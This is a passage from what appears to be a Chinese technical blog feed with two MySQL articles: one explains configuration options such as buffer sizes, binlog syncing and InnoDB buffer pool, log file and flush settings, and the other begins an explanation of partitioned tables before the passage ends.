需要顺序读取数据时，如无法使用索引，其将进行全表扫描或者全索引扫描。这时，MySQL 按照数据的存储顺序依次读取数据块，每次读取的数据块首先会暂存在缓存中，当缓存空间被写满或者全部数据读取结束后，再将缓存中的数据返回给上层调用者，以提高效率。 read-rnd-buffer-size：和顺序读取相对应，当 MySQL 进行非顺序读取（随机读取）数据块的时候，会利用这个缓冲区暂存读取的数据。比如：根据索引信息读取表数据、根据排序后的结果集与表进行 Join 等等。总的来说，就是当数据块的读取需要满足一定的顺序的情况下，MySQL 就需要产生随机读取，进而使用到read-rnd-buffer-size参数所设置的内存缓冲区。 这两个配置都是在扫描 MyISAM 表时有效，且 MySQL 会为每个线程分配内存。对于前者，MySQL 只会在查询需要使用时才会为该缓存分配内存，并且一次性分配该参数指定大小的全部内存，而后者同样是需要时才分配内存，但只分配需要的内存大小而不是参数指定的数值，max-read-rnd-buffer-size(实际上没有这个配置项) 这个名字更能表达这个变量的实际含义。 好习惯 2：不要轻易在全局修改会话级别的配置 对于某些会话级别的设置，不要轻易的在全局增加它们的值，除非你确认这样做是对的。比如：sort-buffer-size，该参数控制排序操作的缓存大小，MySQL 只会在查询需要做排序操作时才会为该缓冲分配内存，一旦需要排序，就会一次性分配指定大小的内存，即使是非常小的排序操作。因此在配置文件中应该配置的小一些，然后在某些查询需要排序时，再在连接中把它调大。比如：1234SET @@seession.sort-buffer-size := -- 执行查询的sqlSET @@seession.sort-buffer-size := DEFAULT -- 恢复默认值-- 可以将类似的代码封装在函数中方便使用。 好习惯 3：配置变量时，并不是值越大越好配置变量时，并不是值越大越好，而且如果设置的值太高，可能更容易导致内存问题。在修改完成后，应该通过监控来确认变量的修改对服务器整体性能的影响。 好习惯 4：规范注释，版本控制在配置文件中写好注释，可能会节省自己和同事大量的工作，一个更好的习惯是把配置文件置于版本控制之下。 说完了好习惯，再来说说不好的习惯。 坏习惯 1：根据一些 “比率” 来调优一个经典的按 “比率” 调优的经验法则是，缓存的命中率应该高于某个百分比，如果命中率过低，则应该增加缓存的大小。这是非常错误的意见，大家可以仔细思考一下：缓存的命中率跟缓存大小有必然联系吗？(分母变大，值就变大了？) 除非确实是缓存太小了。关于 MyISAM 键缓冲命中率，下文会详细说明。 坏习惯 2：随便使用调优脚本尽量不要使用调优脚本！不同的业务场景、不同的硬件环境对 MySQL 的性能要求是不一样的。比如有些业务对数据的完整性要求较高，那么就一定要保证数据不丢失，出现故障后可恢复数据，而有些业务却对数据的完整性要求没那么高，但对性能要求更高。因此，即使是同一个变量，在这两个不同场景下，其配置的值也应该是不同的。那你还能放心的使用网上找到的脚本吗 ？ 本小节示例的几个配置项，仅用于举例说明，并不代表它们有多么重要，请根据实际应用场景配置它们。就比如sort-buffer-size，你真的需要 100M 内存来缓存 10 行数据？ 分段MySQL 配置文件的格式为集中式，通常会分成好几部分，可以为多个程序提供配置，如[client]、[mysqld]、[mysql]等等。MySQL 程序通常是读取与它同名的分段部分。 [client]客户端默认设置内容 [mysql]使用 mysql 命令登录 MySQL 数据库时的默认设置 [mysqld]数据库本身的默认设置 例如服务器 mysqld 通常读取[mysqld]分段下的相关配置项。如果配置项位置不正确，该配置是不会生效的。 GENERAL首先创建一个用户 mysql 来运行 mysqld 进程，请确保这个用户拥有操作数据目录的权限。设置默认端口为 3306，有时为了安全，可能会修改一下。默认选择 Innodb 存储引擎，在大多数情况下是最好的选择。但如果默认是 InnoDB，却需要使用 MyISAM 存储引擎，请显式地进行配置。许多用户认为其数据库使用了某种存储引擎但实际上却使用的是另外一种，就是因为默认配置的问题。 接着设置数据文件的位置，这里把 pid 文件和 socket 文件放到相同的位置，当然也可以选择其它位置，但要注意的是不要将 socket 文件和 pid 文件放到 MySQL 编译的默认位置，因为不同版本的 MySQL，这两个文件的默认路径可能会不一致，最好明确地设置这些文件的位置，以免版本升级时出现问题。 在类 UNIX 系统下本地连接 MySQL 可以采用 UNIX 域套接字方式，这种方式需要一个套接字（socket）文件，即配置中的mysql.sock文件。 当 MySQL 实例启动时，会将自己的进程 ID 写入一个文件中——该文件即为 pid 文件。该文件可由参数pid-file控制，默认位于数据库目录下，文件名为主机名.pid。 DATA STORAGEdatadir用于配置数据文件的存储位置，没有什么好说的。 为缓存分配内存接下来有许多涉及到缓存的配置项，缓存设置多大，最直接的因素肯定是服务器内存的大小。如果服务器只运行 MySQL，所有不需要为 OS 以及查询处理保留的内存都可以用在 MySQL 缓存。为 MySQL 缓存分配更多内存，可以有效的避免磁盘访问，提升数据库性能。大部分情况来说最为重要的缓存： InnoDB 缓冲池 InnoDB 日志文件和 MyISAM 数据的操作系统缓存 (MyISAM 依赖于 OS 缓存数据) MyISAM 键缓存 查询缓存 无法配置的缓存，比如：bin-log 或者表定义文件的 OS 缓存 还有一些其他缓存，但它们通常不会使用太多内存。关于查询缓存，前面文章 (参考本系列的第一篇) 已有介绍，大多数情况下我们不建议开启查询缓存，因此上文的配置中query-cache-type=0表示禁用了查询缓存，相应的查询缓存大小query-cache-size=0。除开查询缓存，剩下关于 InnoDB 和 MyISAM 的相关缓存，在接下来会做详细介绍。 如果只使用单一存储引擎，配置服务器就会简单许多。如果只使用 MyISAM 表，就可以完全关闭 InnoDB，而如果只使用 InnoDB，就只需要分配最少的资源给 MyISAM（MySQL 内部系统表使用 MyISAM 引擎）。但如果是混合使用各种存储引擎，就很难在他们之间找到恰当的平衡，因此只能根据业务做一个猜测，然后在运行中观察服务器运行状况后做出调整。 MyISAMkey-buffer-size key-buffer-size用于配置 MyISAM键缓存大小，默认只有一个键缓存，但是可以创建多个。MyISAM 自身只缓存索引，不缓存数据 (依赖 OS 缓存数据)。如果大部分表都是 MyISAM，那么应该为键缓存设置较多的内存。但如何确定该设置多大？假设整个数据库中表的索引大小为 X，肯定不需要把缓存设置得比 X 还大，所以当前的索引大小就成为这个配置项的重要依据。可以通过下面两种方式来查询当前索引的大小： 1.通过 SQL 语句查询1SELECT SUM(INDEX_LENGTH) FROM INFORMATION_SCHEMA.TABLES WHERE ENGINE = 'MYISAM' 2.统计索引文件的大小123456789101112131415$ du -sch `find /path/to/mysql/data/directory/ -name "*.MYI"`比如：root@dev-msc3:# du -sch `find /var/lib/mysql -name "*.MYI"`72K /var/lib/mysql/static/t_global_region.MYI40K /var/lib/mysql/mysql/db.MYI12K /var/lib/mysql/mysql/proxies_priv.MYI12K /var/lib/mysql/mysql/tables_priv.MYI4.0K /var/lib/mysql/mysql/func.MYI4.0K /var/lib/mysql/mysql/columns_priv.MYI4.0K /var/lib/mysql/mysql/proc.MYI4.0K /var/lib/mysql/mysql/event.MYI4.0K /var/lib/mysql/mysql/user.MYI4.0K /var/lib/mysql/mysql/procs_priv.MYI4.0K /var/lib/mysql/mysql/ndb_binlog_index.MYI164K total 你可能会问，刚创建好的数据库，根本就没什么数据，索引文件大小为 0，那如何配置键缓存大小？这时候只能根据经验值：不超过为操作系统缓存保留内存的 25% ~ 50%。设置一个基本值，等运行一段时间后，根据运行情况来调整键缓存大小。总结来说，索引大小与 OS 缓存的 25%~50% 两者间取小者。当然还可以计算键缓存的使用情况，如果一段时间后还是没有使用完所有的键缓存，就可以把缓冲区调小一点，计算缓存区的使用率可以通过以下公式：(key_blocks_unused * key_cache_block_size) / key_buffer_size 说明： key_blocks_unused 的值可以通过 SHOW STATUS 获取 key_cache_block_size 的值可以通过 SHOW VARIABLES 获取 键缓存块大小是一个比较重要的值，因为它影响 MyISAM、OS 缓存以及文件系统之间的交互。如果缓存块太小，可能会碰到写时读取 (OS 在写数据之前必须先从磁盘上读取一些数据)，关于写时读取的相关知识，大家可以自行查阅。 关于缓存命中率，这里再说一点。缓存命中率有什么意义？其实这个数字没太大的作用。比如 99% 和 99.9% 之间看起来差距很小，但实际上代表了 10 倍的差距。缓存命中率的实际意义与应用也有很大关系，有些应用可以在命中率 99% 下良好的工作，有些 I/O 密集型应用，可能需要 99.99%。所以从经验上来说，每秒未命中次数这个指标实际上会更有用一些。比如每秒 5 次未命中可能不会导致 IO 繁忙，但每秒 100 次缓存未命中则可能出现问题。 MyISAM 键缓存的每秒未命中次数可以通过如下命令监控：123# 计算每隔10s缓存未命中次数的增量# 使用此命令时请带上用户和密码参数：mysqladmin -uroot -pxxx extended-status -r -i 10 | grep Key_reads$ mysqladmin extended-status -r -i 10 | grep Key_reads 最后，即使没有使用任何 MyISAM 表，依然需要将key-buffer-size设置为较小值，比如 32M，因为 MySQL 内部会使用 MyISAM 表，比如 GROUP BY 语句可能会创建 MyISAM 临时表。 myisam-recovermyisam-recover选项用于配置 MyISAM 怎样寻找和修复错误。打开这个选项会通知 MySQL 在打开表时，检查表是否损坏，并在找到问题时进行修复，它可以设置如下值： DEFAULT：表示不设置，会尝试修复崩溃或者未完全关闭的表，但在恢复数据时不会执行其它动作 BACKUP：将数据文件备份到. bak 文件，以便随后进行检查 FORCE：即使. myd 文件中丢失的数据超过 1 行，也让恢复动作继续执行 QUICK：除非有删除块，否则跳过恢复 可以设置多个值，每个值用逗号隔开，比如配置文件中的BACKUP,FORCE会强制恢复并且创建备份，这样配置在只有一些小的 MyISAM 表时有用，因为服务器运行着一些损坏的 MyISAM 表是非常危险的，它们有时可能会导致更多数据损坏，甚至服务器崩溃。然而如果有很大的表，它会导致服务器打开所有的 MyISAM 表时都检查和修复，大表的检查和修复可能会耗费大量时间，且在这段时间里，MySQL 会阻止这个连接做其它任何操作，这显然是不切实际的。 因此，在默认使用 InnoDB 存储引擎时，数据库中只有非常小的 MyISAM 表时，只需要配置key-buffe-size于一个很小的值 (32M) 以及myisam-recover=BACKUP,FORCE。当数据库中大部分表为 MyISAM 表时，请根据上文的公式合理配置key-buffer-size，而myisam-recover则可以关闭，在启动后使用CHECK TABLES和REPAIR TABLES命令来做检查和修复，这样对服务器的影响比较小。 SAFETY基本配置设置到位后，MySQL 已经比较安全了，这里仅仅列出两个需要注意的配置项，如果需要启用一些使服务器更安全和可靠的设置，可以参考 MySQL 官方手册，但需要注意的是，它们其中的一些选项可能会影响性能，毕竟保证安全和可靠需要付出一些代价。 max-allowed-packetmax-allowed-packet防止服务器发送太大的数据包，也控制服务器可以接收多大的包。默认值 4M，可能会比较小。如果设置太小，有时复制上会出问题，表现为从库不能接收主库发过来的复制数据。如果表中有 Blob 或者 Text 字段，且数据量较大的话，要小心，如果数据量超过这个变量的大小，它们可能被截断或者置为 NULL，这里建议设置为 16M。 max-connect-errors这个变量是一个 MySQL 中与安全相关的计数器值，它主要防止客户端暴力破解密码。如果某一个客户端尝试连接 MySQL 服务器失败超过 n 次，则 MySQL 会无条件强制阻止此客户端连接，直到再次刷新主机缓存或者重启 MySQL 服务器。 这个值默认为 10，太小了，有时候网络抽风或者应用配置出现错误导致短时间内不断尝试重连服务器，客户端就会被列入黑名单，导致无法连接。如果在内网环境，可以确认没有安全问题可以把这个值设置的大一点，默认值太容易导致问题。 LOGGING接下来看下日志的配置，对于 MySQL 来说，慢日志和 bin-log 是非常重要的两种日志，前者可以帮助应用程序监控性能问题，后者在数据同步、备份等方面发挥着非常重要的作用。 关于 bin-log 的 3 个配置，log-bin用于配置文件存放路径，expire_logs_days让服务器在指定天数之后清理旧的日志，即配置保留最近多少天的日志。除非有运维手动备份清理 bin-log，否则强烈建议打开此配置，如果不启用，服务器空间最终将会被耗尽，导致服务器卡住或者崩溃。 sync-binlogsync-binlog控制当事务提交之后，MySQL 是否将 bin-log 刷新到磁盘。如果其值等于 0 或者大于 1 时，当事务提交之后，MySQL 不会将 bin-log 刷新到磁盘，其性能最高，但存在的风险也是最大的，因为一旦系统崩溃，bin-log 将会丢失。而当其值等于 1 时，是最安全的，这时候即使系统崩溃，最多也就丢失本次未完成的事务，对实际的数据没有实质性的影响，但性能较差。 需要注意的是，在 5.7.7 之前的版本，这个选择的默认值为 0，而之后的版本默认值为 1，也就是最安全的策略。对于高并发的性能，需要关注这一点，防止版本升级后出现性能问题。 剩下的 4 个配置项就没太多要说的。 log-error：用于配置错误日志的存放目录 slow-query-log：打开慢日志，默认关闭 slow-query-log-file：配置慢日志的存放目录 log-queries-not-using-indexes：如果该 sql 没有使用索引，会将其写入到慢日志，但是否真的执行很慢，需要区分，默认关闭。 CACHES AND LIMITStmp-table-size && max-heap-table-size这两个配置控制使用 Memory 引擎的内存临时表可以使用多大的内存。如果隐式内存临时表的大小超过这两个值，将会被转为磁盘 MyISAM 表 (隐式临时表由服务器创建，用户保存执行中的查询的中间结果)。 如果查询语句没有创建庞大的临时表 (通过合理的索引和查询设计来避免)，可以把这个值设大一点，以免需要把内存临时表转换为磁盘临时表。但要谨防这个值设置得过大，如果查询确实会创建很大的临时表，那么还是使用磁盘比较好，毕竟并发数一起来，所需要的内存就会急剧增长。 应该简单的把这两个变量设为同样的值，这里选择了 32M，可以通过仔细检查created-tmp-disk-tables和created-tmp-tables两个变量来指导你设置，这两个变量的值将展示临时表的创建有多频繁。 max-connections 用于设置用户的最大连接数，保证服务器不会应为应用程序激增的连接而不堪重负。如果应用程序有问题，或者服务器遇到连接延迟问题，会创建很多新连接。但如果这些连接不能执行查询，那打开一个连接没什么好处，所以被 “太多的连接” 错误拒绝是一种快速而且代价小的失败方式。 在服务器资源允许的情况下，可以把max-connections设置的足够大，以容纳正常可能达到的负载。若认为正常情况将有 300 或者更多连接，可以设置为 500 或者更多 (应对高峰期)。默认值是 100，太小了，这里设置为 500，但并不意味着其是一个合理的值，应该监控应用有多少连接，然后根据监控值 (观察max_used_connections随时间的变化) 来设置。 thread-cache-size 线程缓存保存那些当前没有与连接关联但是准备为后面新连接服务的线程。当一个新的连接创建时，如果缓存中有线程存在，MySQL 则从缓存中删除一个线程，并且把它分配给这个新连接。当连接关闭时，如果线程缓存还有空间的话，MySQL 又会把线程放回缓存。如果没有空间的话，MySQL 会销毁这个线程。只要 MySQL 在缓存里还有空闲的线程，它就可以迅速响应连接请求，因为这样就不用为每个连接创建新线程。thread-cache-size指定 MySQL 可以保存在缓存中的线程数量。如果服务器没有很多的连接请求，一般不需要配置这个值。 如何判断这个值该设置多大？ 观察threads-connected变量，如果threads-connected在 100-120，那么thread-cache-size设置为 20。如果它保持在 500-700，200 的线程缓存应该足够大了。可以这么理解：当同时有 700 个连接时，可能缓存中没有线程。在 500 个连接时，有 200 个缓存的线程准备为负载再次增加到 700 个连接时使用。 open-files-limit 在类 Uinux 系统上我们把它设置得尽可能大。现代 OS 中打开句柄开销都很小，如果此参数设置过小，可能会遇到 “打开的文件太多 (too many open files)” 错误。 table_cache_size 表缓存跟线程缓存类似，但存储的对象是表，其包含表. frm 文件的解析结果和一些其他数据。准确的说，缓存的数据依赖于存储引擎，比如，对于 MyISAM，缓存表的数据和索引的文件描述符。表缓存对 InnoDB 的存储引擎来说，重要性会小很多，因为 InnoDB 不依赖它来做那么多的事。 从 5.1 版本及以后，表缓存就被分为两个部分：打开表缓存和定义表缓存，分别通过table-open-cache-size和table-definition-cache-size变量来配置。通常可以把table-definition-cache-size设置得足够高，以缓存所有的表定义，因为大部分存储引擎都能从table-definition-cache获益。 InnoDB InnoDB 应该是使用最广发的存储引擎，最重要的配置选项是下面这两个：innodb-buffer-pool-size与innodb-log-file-size，解决这两个配置基本上就解决了真实场景下的大部分配置问题。 innodb-buffer-pool-size 如果大部分是 InnoDB 表，那么 InnoDB 缓冲池或许比其他任何东西都更需要内存，InnoDB 缓冲池缓冲的数据：索引、行数据、自适应哈希索引、插入缓冲、锁以及其他内部数据结构。InnoDB 还使用缓冲池来帮助延迟写入，这样就可以合并多个写入操作，然后一起顺序写入，提升性能。总之，InnoDB 严重依赖缓冲池，必须为其分配足够的内存。 当然，如果数据量不大且不会快速增长，就没有必要为缓冲池分配过多的内存，把缓冲池配置得比需要缓存的表和索引还要大很多，实际上也没有什么意义。很大的缓冲池也会带来一些挑战，例如，预热和关闭都会花费很长的时间。如果有很多脏页在缓冲池里，InnoDB 关闭时可能会花很长时间来把脏页写回数据文件。虽然可以快速关闭，但是在启动时需要做更多的恢复工作，也就是说我们无法同时加速关闭和重启两个操作。当有一个很大的缓冲池，重启服务需要花费很长时间（几小时或者几天）来预热，尤其是磁盘很慢的时候，如果想加快预热时间，可以在重启后立刻进行全表扫描或者索引扫描，把索引载入缓冲池。 可以看到示例的配置文件中把这个值配置为 12G，这不是一个标准配置，需要根据具体的硬件来估算。那如何估算？ 前面的小节，我们说到，MySQL 中最重要的缓存有 5 种，可以简单的使用下面的公式计算： InnoDB 缓冲池 = 服务器总内存 - OS 预留 - 服务器上的其他应用占用内存 - MySQL 自身需要的内存 - InnoDB 日志文件占用内存 - 其它内存 (MyISAM 键缓存、查询缓存等) 具体来看，至少需要为 OS 保留 1~2G 内存，如果机器内存大的话可以预留多一些，建议 2GB 和总内存的 5% 为基准，以较大者为准，如果机器上还运行着一些内存密集型任务，比如，备份任务，那么可以为 OS 再预留多一些内存。不要为 OS 缓存增加任何内存，因为 OS 通常会利用所有剩下的内存来做文件缓存。 一般来说，运行 MySQL 的服务器很少会运行其他应用程序，但如果有的话，请为这些应用程序预留足够多的内存。 MySQL 自身运行还需要一些内存，但通常都不会太大。需要考虑 MySQL 每个连接需要的内存，虽然每个连接需要的内存都很少，但它还要求一个基本量的内存来执行任何给定的查询，而且查询过程中还需要为排序、GROUP BY 等操作分配临时表内存，因此需要为高峰期执行大量的查询预留足够的内存。这个内存有多大？只能在运行过程中监控。 如果大部分表都是 InnoDB，MyISAM 键缓存配置一个很小值足矣，查询缓存也建议关闭。 公式中就剩下 InnoDB 日志文件了，这就是我们接下来要说的。 innodb-log-file-size && innodb-log-files-in-group 如果对 InnoDB 数据表有大量的写入操作，那么选择合适的innodb-log-file-size值对提升 MySQL 性能很重要。InnoDB 使用日志来减少提交事务时的开销。日志中记录了事务，就无须在每个事务提交时把缓冲池的脏块 (缓存中与磁盘上数据不一致的页) 刷新到磁盘。事务修改的数据和索引通常会映射到表空间的随机位置，所以刷新这些变更到磁盘需要很多随机 I/O。一旦日志安全的写入磁盘，事务就持久化了，即使变更还没有写到数据文件，在一些意外情况发生时 (比如断电了)，InnoDB 可以重放日志并且恢复已经提交的事务。 InnoDB 使用一个后台线程智能地刷新这些变更到数据文件。实际上，事务日志把数据文件的随机 I/O 转换为几乎顺序地日志文件和数据文件 I/O，让刷新操作在后台可以更快的完成，并且缓存 I/O 压力。 整体的日志文件大小受控于innodb-log-file-size和innodb-log-files-in-group两个参数，这对写性能非常重要。日志文件的总大小是每个文件的大小之和。默认情况下，只有两个 5M 的文件，总共 10M，对高性能工作来说太小了，至少需要几百 M 或者上 G 的日志文件。这里要注意innodb-log-files-in-group这个参数，它控制日志文件的数量，从名字上看好似配置一个日志组有几个文件，实际上，log group表示一个重做日志的文件集合，没有参数也没有必要配置有多少个日志组。 修改日志文件的大小，需要完全关闭 MySQL，然后将旧的日志文件迁移到其他地方，重新配置参数，然后重启。重启时需要将旧的日志迁移回来，然后等待 MySQL 恢复数据后，再删除旧的日志文件，请一定要查看错误日志，确认 MySQL 重启成功后再删除旧的日志文件。 想要确定理想的日志文件大小，需要权衡正常数据变更的开销，以及崩溃时恢复需要的时间。如果日志太小，InnoDB 将必须要做更多的检查点，导致更多的日志写，在极个别情况下，写语句还会被拖累，在日志没有空间继续写入前，必须等待变更被刷新到数据文件。另一方面，如果日志太大，在崩溃时恢复就得做大量的工作，这可能增大恢复时间。InnoDB 会采用 checkpoint 机制来刷新和恢复数据，这会加快恢复数据的时间，具体可以参考： MySQL-checkpoint 技术 How InnoDB performs a checkpoint innodb-flush-log-at-trx-commit 前面讨论了很多缓存，InnoDB 日志也是有缓存的。当 InnoDB 变更任何数据时，会写一条变更记录到日志缓存区。在缓冲慢的时候、事务提交的时候，或者每一秒钟，InnoDB 都会将缓冲区的日志刷新到磁盘的日志文件。如果有大事务，增加日志缓冲区大小可以帮助减少 I/O，变量innodb-log-buffer-size可以控制日志缓冲区的大小。通常不需要把日志缓冲区设置的非常大，毕竟上述 3 个条件，任一条件先触发都会把缓冲区的内容刷新到磁盘，所以缓冲区的数据肯定不会太多，出入你的数据中有很多相当大的 BLOB 记录。通常来说，配置 1M~8M 即可。 既然存在缓冲区，怎样刷新日志缓冲就是我们需要关注的问题。日志缓冲必须刷新到磁盘，以确保提交的事务完全被持久化。如果和持久化相比，更在乎性能，可以修改 innodb-flush-log-at-trx-commit 变量来控制日志缓冲刷新的频率。 0：每 1 秒钟将日志缓冲写到日志文件并刷新到磁盘，事务提交时不做任何处理 1：每次事务提交时，将日志缓冲写到日志文件并刷新到磁盘 2：每次事务提交时，将日志缓冲写到日志文件，然后每秒刷新一次到磁盘 1 是最安全的设置，保证不会丢失任何已经提交的事务，这也是默认的设置。 0 和 2 最主要的区别是，如果 MySQL 挂了，2 不会丢失事务，但 0 有可能， 2 在每次事务提交时，至少将日志缓冲刷新到操作系统的缓存，而 0 则不会。如果整个服务器挂了或者断电了，则还是可能会丢失一些事务。 innodb-flush-method 前面都在讨论使用什么样的策略刷新、以及何时刷新日志或者数据，那 InnoDB 具体是怎样刷新数据的？使用innodb-flush-method选项可以配置 InnoDB 如何跟文件系统相互作用。从名字上看，会以为只能影响 InnoDB 怎么写数据，实际上还影响了 InnoDB Windows 和非 Windows 操作系统下这个选项的值是互斥的，也就是说有些值只能 Windows 下使用，有些只能在非 Windows 下使用，其中 Windows 下可取值：async_unbuffered、unbuffered、normal、Nosync与littlesync，非 Windows 取值：fdatasync、0_DIRECT、 0_DSYNC。 这个选项既会影响日志文件，也会影响数据文件，而且有时候对不同类型的文件的处理也不一样，导致这个选项有些难以理解。如果有一个选项来配置日志文件，一个选项来配置数据文件，应该会更好，但实际上它们混合在同一个配置项中。这里只介绍类 Unix 操作系统下的选项。 fdatasync InnoDB 调用fsync()和fdatasync()函数来刷新数据和日志文件，其中fdatasync()只刷文件的数据，但不包含元数据 (比如：访问权限、文件拥有者、最后修改时间等描述文件特征的系统数据)，因此fsync()相比fdatasync()会产生更多的 I/O，但在某些场景下fdatasync()会导致数据损坏，因此 InnoDB 开发者决定用fsync()来代替fdatasync()。 fsync()的缺点是操作系统会在自己的缓存中缓冲一些数据，理论上双重缓冲是浪费的，因为 InnoDB 自己会管理缓冲，而且比操作系统更加智能。但如果文件系统能有更智能的 I/O 调度和批量操作，双重缓冲也并不一定是坏事： 有的文件系统和 os 可以累积写操作后合并执行，通过对 I/O 的重排序来提升效率、或者并发写入多个设备 有的还可以做预读优化，比如连续请求几个顺序的块，它会通知硬盘预读下一个块 这些优化在特定的场景下才会起作用，fdatasync为innodb-flush-method的默认值。 0_DIRCET 这个设置不影响日志文件并且不是所有的类 Unix 系统都有效，但至少在 Linux、FreeBSD 以及 Solaris 是支持的。这个设置依然使用 fsync 来刷新文件到磁盘，但是它完全关闭了操作系统缓存，并且是所有的读和写都直接通过存储设置，避免了双重缓冲。如果存储设备支持写缓冲或预读，那么这个选项并不会影响到设备的设置，比如 RAID 卡。 0_DSYNC 这个选项使得所有的写同步，即只有数据写到磁盘后写操作才返回，但它只影响日志文件，而不影响数据文件。 说完了每个配置的作用，最后是一些建议：如果使用类 Unix 操作系统并且 RAID 控制器带有电池保护的写缓存，建议使用 0_DIRECT，如果不是，默认值或者 0_DIRECT 都可能是最好的选择。 innodb-file-per-table 最后一个配置，说说 InnoDB 表空间，InnoDB 把数据保存在表空间内，它本质上是一个由一个或者多个磁盘文件组成的虚拟文件系统。InnoDB 表空间并不只是存储表和索引，它还保存了回滚日志、插入缓冲、双写缓冲以及其他内部数据结构，除此之外，表空间还实现了很多其它的功能。可以通过 innodb-data-file-path 配置项定制表空间文件，innodb-data-home-dir配置表空间文件存放的位置，比如：12innodb-data-home-dir = /var/lib/mysqlinnodb-data-file-path = ibdata1:1G;ibdata2:1G;ibdata3:1G 这里在 3 个文件中创建了 3G 表空间，为了允许表空间在超过了分配的空间时还能增长，可以像这样配置最后一个文件自动扩展1innodb-data-file-path = ibdata1:1G;ibdata2:1G;ibdata3:1G:autoextend innodb-file-per-table选项让 InnoDB 为每张表使用一个文件，这使得在删除一张表时回收空间容易很多，而且特别容易管理，并且可以通过查看文件大小来确定表大小，所以这里建议打开这个配置。 总结MySQL 有太多的配置项，这里没有办法一一列举，重要的是了解每个配置的工作原理，从一个基础配置文件开始，设置符合服务器软硬件环境与工作负载的基本选项。 参考资料高性能 MySQL(第 3 版) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 优化原理(二)]]></title>
    <url>%2F2019%2F03%2F29%2Fmysql-optimization-principle-2%2F</url>
    <content type="text"><![CDATA[我打你应该，不打你悲哀~ 前言如果有同学看完上一篇关于 MySQL 文章，文末留有两个很开放的问题，如有兴趣可以在脑袋里想想。本文也会试着回答这两个问题，希望能给你一些参考。现在可以思考一个问题，如果数据量非常大的情况下，您根据业务选择了合适的字段，精心设计了表和索引，还仔细的检查了所有的 SQL，并确认已经没什么问题，但性能仍然不能满足您的要求，该怎么办呢？还有其他优化策略吗？答案是肯定的。接下来继续和您讨论一些常用的 MySQL 高级特性以及其背后的工作原理。 分区表合理的使用索引可以极大提升 MySQL 的查询性能，但如果单表数据量达到一定的程度，索引就无法起作用，因为在数据量超大的情况下，除非覆盖索引，因回表查询会产生大量的随机 I/O，数据库的响应时间可能会达到不可接受的程度。而且索引维护（磁盘空间、I/O 操作）的代价也会非常大。 因此，当单表数据量达到一定程度时（在 MySQL4.x 时代，MyISAM 存储引擎业内公认的性能拐点是 500W 行，MySQL5.x 时代的性能拐点则为 1KW ~ 2KW 行级别，具体需根据实际情况测试），为了提升性能，最为常用的方法就是分表。分表的策略可以是垂直拆分（比如：不同订单状态的订单拆分到不同的表），也可以是水平拆分（比如：按月将订单拆分到不同表）。但总的来说，分表可以看作是从业务角度来解决大数据量问题，它在一定程度上可以提升性能，但也大大提升了编码的复杂度，有过这种经历的同学可能深有体会。 在业务层分表大大增加了编码的复杂程度，而且处理数据库的相关代码会大量散落在应用各处，维护困难。那是否可以将分表的逻辑抽象出来，统一处理，这样业务层就不用关心底层是否分表，只需要专注在业务即可。答案当然是肯定的，目前有非常多的数据库中间件都可以屏蔽分表后的细节，让业务层像查询单表一样查询分表后的数据。如果再将抽象的逻辑下移到数据库的服务层，就是我们今天要讲的分区表。 分区可以看作是从技术层面解决大数据问题的有效方法，简单的理解，可以认为是 MySQL 底层帮我们实现分表，分区表是一个独立的逻辑表，底层由多个物理子表组成。存储引擎管理分区的各个底层表和管理普通表一样（所有底层表必须使用相同的存储引擎），分区表的索引也是在各个底层表上各自加上一个完全相同的索引。从存储引擎的角度来看，底层表和普通表没有任何不同，存储引擎也无须知道。在执行查询时，优化器会根据分区的定义过滤那些没有我们需要数据的分区，这样查询就无需扫描所有分区，只需要查找包含需要数据的分区就可以了。 更好的理解分区表，我们从一个示例入手：一张订单表，数据量大概有 10TB，如何设计才能使性能达到最优？ 首先可以肯定的是，因为数据量巨大，肯定不能走全表扫描。使用索引的话，你会发现数据并不是按照想要的方式聚集，而且会产生大量的碎片，最终会导致一个查询产生成千上万的随机 I/O，应用随之僵死。所以需要选择一些更粗粒度并且消耗更少的方式来检索数据。比如先根据索引找到一大块数据，然后再在这块数据上顺序扫描。 这正是分区要做的事情，理解分区时还可以将其当作索引的最初形态，以代价非常小的方式定位到需要的数据在哪一片 “区域”，在这片 “区域” 中，你可以顺序扫描，可以建索引，还可以将数据都缓存在内存中。因为分区无须额外的数据结构记录每个分区有哪些数据，所以其代价非常低。只需要一个简单的表达式就可以表达每个分区存放的是什么数据。 对表分区，可以在创建表时，使用如下语句：12345678910CREATE TABLE sales { order_date DATETIME NOT NULL -- other columns} ENGINE=InnoDB PARTITION BY RANGE(YEAR(order_date)) ( PARTITION p_2014 VALUES LESS THAN (2014), PARTITION p_2015 VALUES LESS THAN (2015) PARTITION p_2016 VALUES LESS THAN (2016) PARTITION p_2017 VALUES LESS THAN (2017) PARTITION p_catchall VALUES LESS THAN MAXVALUE) 分区子句中可以使用各种函数，但表达式的返回值必须是一个确定的整数，且不能是一个常数。MySQL 还支持一些其他分区，比如键值、哈希、列表分区，但在生产环境中很少见到。在 MySQL5.5 以后可以使用 RANGE COLUMNS 类型分区，这样即使是基于时间分区，也无需再将其转化成一个整数。 接下来简单看下分区表上的各种操作逻辑： SELECT：当查询一个分区表时，分区层先打开并锁住所有的底层表，优化器先判断是否可以过滤部分分区，然后在调用对应的存储引擎接口访问各个分区的数据 INSERT：当插入一条记录时，分区层先打开并锁住所有的底层表，然后确定哪个分区接收这条记录，再将记录写入对应的底层表，DELETE操作与其类似 UPDATE：当更新一条数据时，分区层先打开并锁住所有的底层表，然后确定数据对应的分区，然后取出数据并更新，再判断更新后的数据应该存放到哪个分区，最后对底层表进行写入操作，并对原数据所在的底层表进行删除操作 有些操作是支持条件过滤的。例如，当删除一条记录时，MySQL 需要先找到这条记录，如果WHERE条件恰好和分区表达式匹配，就可以将所有不包含这条记录的分区都过滤掉，这对UPDATE语句同样有效。如果是INSERT操作，本身就只命中一个分区，其他分区都会被过滤。 虽然每个操作都会 “先打开并锁住所有的底层表”，但这并不是说分区表在处理过程中是锁住全表的。如果存储引擎能够自己实现行级锁，例如 InnoDB，则会在分区层释放对应表锁。这个加锁和解锁的操作过程与普通 InnoDB 上的查询类似。 在使用分区表时，为了保证大数据量的可扩展性，一般有两个策略： 